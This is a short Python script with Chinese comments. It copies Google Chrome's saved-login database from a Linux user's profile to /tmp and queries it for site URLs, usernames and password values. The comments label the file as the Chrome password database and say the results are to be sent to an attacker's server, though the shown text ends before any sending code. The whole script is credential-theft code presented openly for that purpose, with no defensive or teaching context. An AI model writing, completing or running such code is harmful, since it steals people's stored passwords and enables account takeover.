import sqlite3
import shutil
import os

# Chrome 密码数据库路径
chrome_db = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
temp_db = "/tmp/chrome_temp.db"

shutil.copy2(chrome_db, temp_db)
conn = sqlite3.connect(temp_db)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
# 发送到攻击者服务器
